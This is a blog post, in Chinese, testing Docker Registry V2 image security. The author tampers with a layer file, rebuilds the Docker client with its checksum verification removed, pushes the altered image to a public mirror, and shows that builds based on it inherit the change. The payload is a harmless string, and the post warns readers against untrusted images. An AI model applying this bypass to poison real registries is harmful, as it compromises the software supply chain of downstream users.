title: "Registry V2时代安全依然要警惕"
date: 2015-12-13 09:40:33
categories: 技术
tags: [nginx,docker]
---

## VERSION:1

![](http://7viiaq.com1.z0.glb.clouddn.com/images.png)

## 摘要：
在`Registry V1` 的时代，用户是可以随意篡改Layer中的文件的。参考这里：[https://titanous.com/posts/docker-insecurity](https://titanous.com/posts/docker-insecurity) 在国内各大CAAS都更新到V2之后依然勾起了我的好奇心，这是怎样的一番过程。

在下文中描述了我的各种测试的实践过程，也是为了加深对Docker的了解，虽然我事先就知道这个bug被修复了。

但是`请不要随便用别人给你的Repository 地址，即使是正规的CAAS平台上的也要小心三分`

因为之前我[介绍Rancher](http://www.philo.top/2015/11/29/RancherOStest/)之后。大家可以看看部署量[https://console.tenxcloud.com/docker-registry/detail?imageName=philo/rancheros](https://console.tenxcloud.com/docker-registry/detail?imageName=philo/rancheros)当然我没有恶意篡改过layers内容。

实践过程略长，主要结论都在上面了给出，想节约时间的小伙伴下面可以略看。

## 想法过程

通过nginx网页来测试恶意代码是否能进入到其他用户的容器。

1. 构建一个带正常内容网页的image
2. 推送到docker hub
3. 修改layers，注入恶意代码， 推送到时速云
4. 换个用户在然后使用image 基于docker hub上的image
5. 推送到时速云看看image是否已经存在，如果存在那么注入就成功了，如果不存在那么registry v2就没有此类安全问题了。

## 实践


### nginx:latest layers 

```
root@Love:~/testinjection# docker history nginx
IMAGE               CREATED             CREATED BY                                      SIZE                COMMENT
6ffc02088cb8        4 days ago          /bin/sh -c #(nop) CMD ["nginx" "-g" "daemon o   0 B
0d30b5fc3b42        4 days ago          /bin/sh -c #(nop) EXPOSE 443/tcp 80/tcp         0 B
b023a689b825        4 days ago          /bin/sh -c #(nop) VOLUME [/var/cache/nginx]     0 B
9b5308412022        4 days ago          /bin/sh -c ln -sf /dev/stderr /var/log/nginx/   11 B
a631f743c7d3        4 days ago          /bin/sh -c ln -sf /dev/stdout /var/log/nginx/   11 B
8d762e7c0e54        4 days ago          /bin/sh -c apt-get update &&     apt-get inst   8.747 MB
9965ce855336        4 days ago          /bin/sh -c #(nop) ENV NGINX_VERSION=1.9.8-1~j   0 B
146400830f31        7 days ago          /bin/sh -c echo "deb http://nginx.org/package   221 B
50e5c9c52d5d        7 days ago          /bin/sh -c apt-key adv --keyserver hkp://pgp.   1.997 kB
3244b9987276        7 days ago          /bin/sh -c #(nop) MAINTAINER NGINX Docker Mai   0 B
8b9a99209d5c        7 days ago          /bin/sh -c #(nop) CMD ["/bin/bash"]             0 B
6d1ae97ee388        7 days ago          /bin/sh -c #(nop) ADD file:863d6edd178364362a   125.1 MB
```

### 测试Dockerfile
```
FROM nginx
COPY 1577f46edfae12423a1985800c018318.html /usr/share/nginx/html/
CMD ["nginx", "-g", "daemon off;"]
```

写入文件内容：
```
root@Love:~/testinjection# cat 1577f46edfae12423a1985800c018318.html
it works
```

构建它：
```
root@Love:~/testinjection# docker build -t lijianying10/nginxtest1:0 .
```

查看新的image的layers
```
root@Love:~/testinjection# docker history lijianying10/nginxtest1:0
IMAGE               CREATED              CREATED BY                                      SIZE                COMMENT
7e2848dc9a3e        About a minute ago   /bin/sh -c #(nop) CMD ["nginx" "-g" "daemon o   0 B
d33adc4d8484        About a minute ago   /bin/sh -c #(nop) COPY file:bc24671d305c24a3d   9 B
```

多了上面这两层

### 选择d33adc4d8484这个层作为攻击目标

push 到dockerhub
```
root@Love:~/testinjection# docker push lijianying10/nginxtest1:0
The push refers to a repository [docker.io/lijianying10/nginxtest1] (len: 1)
7e2848dc9a3e: Image successfully pushed
d33adc4d8484: Image successfully pushed
6ffc02088cb8: Image already exists
0d30b5fc3b42: Image already exists
b023a689b825: Image already exists
9b5308412022: Image successfully pushed
a631f743c7d3: Image successfully pushed
8d762e7c0e54: Image successfully pushed
9965ce855336: Image already exists
146400830f31: Image successfully pushed
50e5c9c52d5d: Image successfully pushed
3244b9987276: Image already exists
8b9a99209d5c: Image already exists
6d1ae97ee388: Image successfully pushed
0: digest: sha256:7c2c29250120abf80723fdd833296f88bb8695642fb69bb3c9c1b67031b6b86a size: 26486
```
不知道为啥有的不是already exists

在aufs中找到攻击目标中的文件：
```
root@Love:/var/lib/docker# vim ./aufs/diff/d33adc4d84842dce3699819ceef8a6e646d750c5f88ca76e396e735b22d635ca/usr/share/nginx/html/1577f46edfae12423a1985800c018318.html
```

内容改成：Code Injection

运行篡改过后的Image：
```
docker run -it --rm -p 8888:80 lijianying10/nginxtest1:0
Love - - [12/Dec/2015:19:11:38 +0000] "GET /1577f46edfae12423a1985800c018318.html HTTP/1.1" 200 15 "-" "curl/7.35.0" "-"

root@Love:~# curl http://co.newb.xyz:8888/1577f46edfae12423a1985800c018318.html
Code Injection
```
容器运行并未对文件完整性做检查

然而我篡改代码后ID并没有改变：
```
root@Love:/var/lib/docker# docker history lijianying10/nginxtest1:0
IMAGE               CREATED             CREATED BY                                      SIZE                COMMENT
7e2848dc9a3e        14 minutes ago      /bin/sh -c #(nop) CMD ["nginx" "-g" "daemon o   0 B
d33adc4d8484        14 minutes ago      /bin/sh -c #(nop) COPY file:bc24671d305c24a3d   9 B
```

去污染Tenxcloud
```
root@Love:/var/lib/docker# docker tag lijianying10/nginxtest1:0 index.tenxcloud.com/philo/nginxtest1:0
root@Love:/var/lib/docker# docker push index.tenxcloud.com/philo/nginxtest1:0
The push refers to a repository [index.tenxcloud.com/philo/nginxtest1] (len: 1)
7e2848dc9a3e: Image successfully pushed
d33adc4d8484: Buffering to Disk
file integrity checksum failed for "usr/share/nginx/html/1577f46edfae12423a1985800c018318.html"
```
发现有checksum 
https://github.com/docker/docker/issues/1105
这里面说早期版本里面就直接可以重新算,而且已经修复了。所以不能通过删除checksum来推送。

但是在客户端而且docker是开源的我直接把不要的逻辑修掉。

在1.8.1 版本里面定位代码位置：vendor/src/github.com/vbatts/tar-split/tar/asm/assemble.go:59

```
if !bytes.Equal(c.Sum(nil), entry.Payload) {
    // I would rather this be a comparable ErrInvalidChecksum or such,
    // but since it's coming through the PipeReader, the context of
    // _which_ file would be lost...
    fh.Close()
    pw.CloseWithError(fmt.Errorf("file integrity checksum failed for %q", entry.Name))
    return
}
```
嗯哼就是这里了。干掉他！

重新编译docker这个版本
```
Client:
 Version:      1.8.1
 API version:  1.20
 Go version:   go1.4.2
 Git commit:
 Built:
 OS/Arch:      linux/amd64

Server:
 Version:      1.8.1
 API version:  1.20
 Go version:   go1.4.2
 Git commit:   d12ea79
 Built:        Thu Aug 13 02:35:49 UTC 2015
 OS/Arch:      linux/amd64
```

然后我就污染进去了
```
root@Love:/usr/bin# docker push index.tenxcloud.com/philo/nginxtest1:0
The push refers to a repository [index.tenxcloud.com/philo/nginxtest1] (len: 1)
7e2848dc9a3e: Image already exists
d33adc4d8484: Image successfully pushed
6ffc02088cb8: Image already exists
0d30b5fc3b42: Image already exists
b023a689b825: Image already exists
9b5308412022: Image successfully pushed
a631f743c7d3: Image successfully pushed
8d762e7c0e54: Image successfully pushed
9965ce855336: Image already exists
146400830f31: Image successfully pushed
50e5c9c52d5d: Image successfully pushed
3244b9987276: Image already exists
8b9a99209d5c: Image already exists
6d1ae97ee388: Image successfully pushed
0: digest: sha256:cc9926b902b4db360a8a54f5ca420d018b352d60e0a2c89029ed0bc0e80048b2 size: 26479
```

找台机器看看结果


```
docker run -it --rm -p 8888:80 index.tenxcloud.com/philo/nginxtest1:0
192.168.99.1 - - [13/Dec/2015:00:33:06 +0000] "GET /1577f46edfae12423a1985800c018318.html HTTP/1.1" 200 9 "-" "curl/7.43.0" "-"

curl http://192.168.99.100:8888/1577f46edfae12423a1985800c018318.html
Code Inje%
```
发现已经污染了。可以等待其他用户中招，但是长度有问题，注入的代码长度不能比原来长。

准备清空恶意image模拟中招用户：
```
root@Love:~# docker rmi index.tenxcloud.com/philo/nginxtest1:0
Untagged: index.tenxcloud.com/philo/nginxtest1:0
root@Love:~# docker rmi lijianying10/nginxtest1:0
Untagged: lijianying10/nginxtest1:0
Deleted: 7e2848dc9a3e8d4d9d7b77708aad477937652bcdf486dd964e532d6c3aacc4e5
Deleted: d33adc4d84842dce3699819ceef8a6e646d750c5f88ca76e396e735b22d635ca
root@Love:~# docker logout index.tenxcloud.com
Remove login credentials for index.tenxcloud.com
```

用户正常构建测试他的image：
注意： 1577f46edfae12423a1985800c018318.html 代表注入的恶意程序比如说注入到bash mysql等等常用程序脚本里面
        hello.html 代表用户正常程序
        curl为手动调用过程 ， 在实际的恶意程序中由用户的主动调用来实现注入恶意代码。

用户从DockerHub中拉取内容构建Image
```
root@Love:~/testinjection# cat Dockerfile
FROM lijianying10/nginxtest1:0
COPY hello.html /usr/share/nginx/html/
CMD ["nginx", "-g", "daemon off;"]

root@Love:~/testinjection# docker build -t myfoo:0 .
Sending build context to Docker daemon 3.072 kB
Step 0 : FROM lijianying10/nginxtest1:0
0: Pulling from lijianying10/nginxtest1

d33adc4d8484: Pull complete
7e2848dc9a3e: Pull complete
6d1ae97ee388: Already exists
8b9a99209d5c: Already exists
3244b9987276: Already exists
50e5c9c52d5d: Already exists
146400830f31: Already exists
9965ce855336: Already exists
8d762e7c0e54: Already exists
a631f743c7d3: Already exists
9b5308412022: Already exists
b023a689b825: Already exists
0d30b5fc3b42: Already exists
6ffc02088cb8: Already exists
Digest: sha256:7c2c29250120abf80723fdd833296f88bb8695642fb69bb3c9c1b67031b6b86a
Status: Downloaded newer image for lijianying10/nginxtest1:0
 ---> 7e2848dc9a3e
Step 1 : COPY hello.html /usr/share/nginx/html/
 ---> 932b144a3e74
Removing intermediate container 884af8928f47
Step 2 : CMD nginx -g daemon off;
 ---> Running in f0d84733ab86
 ---> 855209f4480a
Removing intermediate container f0d84733ab86
Successfully built 855209f4480a
```
build日志中显示用户从dockerhub中拉取了攻击目标layer

用户正常测试程序
```
root@Love:/usr/bin# curl http://co.newb.xyz:8888/1577f46edfae12423a1985800c018318.html
it works
root@Love:/usr/bin# curl http://co.newb.xyz:8888/hello.html
hello it works
```
用户正常调用系统底层程序并且返回正常结果  it works，用户把程序推送到Tenx准备部署。

推送
```
root@Love:/usr/bin# docker push index.tenxcloud.com/philo2/myfoo:0
The push refers to a repository [index.tenxcloud.com/philo2/myfoo] (len: 1)
855209f4480a: Image successfully pushed
932b144a3e74: Image successfully pushed
7e2848dc9a3e: Image already exists
d33adc4d8484: Image successfully pushed
6ffc02088cb8: Image already exists
0d30b5fc3b42: Image already exists
b023a689b825: Image already exists
9b5308412022: Image successfully pushed
a631f743c7d3: Image successfully pushed
8d762e7c0e54: Image successfully pushed
9965ce855336: Image already exists
146400830f31: Image successfully pushed
50e5c9c52d5d: Image successfully pushed
3244b9987276: Image already exists
8b9a99209d5c: Image already exists
6d1ae97ee388: Image successfully pushed
```
貌似没有显示已经存在，checksum应该是发挥了作用。

但是启动不成功。。。。
```
Failed to pull image "index.tenxcloud.com/philo2/myfoo:0": image pull failed for index.tenxcloud.com/philo2/myfoo:0, this may be because there are no credentials on this request. details: (Error: image philo2/myfoo:0 not found)
```
时速云报错在上面,但是很快就好了。估计重启之后。pull下来就没有问题了。

# registry v2 不会出现恶意污染这种问题

但是有一些Image比较大，大家会通过Tenxcloud来加速Docker image的构建。
比如说通过网络搜索之类的方法搜索到index.tenxcloud.com/philo/nginxtest1:0 就是dockerhub上的加速镜像。
那么使用它构建会不会中招呢？（绕过checksum）


```
➜  testinj  docker build -t ttttt:t .
Sending build context to Docker daemon 2.048 kB
Step 0 : FROM index.tenxcloud.com/philo/nginxtest1:0
0: Pulling from philo/nginxtest1
3244b9987276: Pull complete
50e5c9c52d5d: Pull complete
146400830f31: Pull complete
9965ce855336: Pull complete
8d762e7c0e54: Pull complete
a631f743c7d3: Pull complete
9b5308412022: Pull complete
b023a689b825: Pull complete
0d30b5fc3b42: Pull complete
6ffc02088cb8: Pull complete
d33adc4d8484: Pull complete
7e2848dc9a3e: Pull complete
6d1ae97ee388: Already exists
8b9a99209d5c: Already exists
Digest: sha256:cc9926b902b4db360a8a54f5ca420d018b352d60e0a2c89029ed0bc0e80048b2
Status: Downloaded newer image for index.tenxcloud.com/philo/nginxtest1:0
 ---> 7e2848dc9a3e
Step 1 : CMD nginx -g daemon off;
 ---> Running in 755303bddb18
 ---> 25f006687772
Removing intermediate container 755303bddb18
Successfully built 25f006687772

➜  testinj  docker run -it --rm -p 8888:80 ttttt:t
192.168.99.1 - - [13/Dec/2015:01:34:02 +0000] "GET /1577f46edfae12423a1985800c018318.html HTTP/1.1" 200 9 "-" "curl/7.43.0" "-"

➜  ~  curl http://192.168.99.100:8888/1577f46edfae12423a1985800c018318.html
Code Inje%
```


## 结果是用不明来源的image是会中招的。而且id都一样无法肉眼辨识
所以千万不要用怪蜀黍给的Image地址。


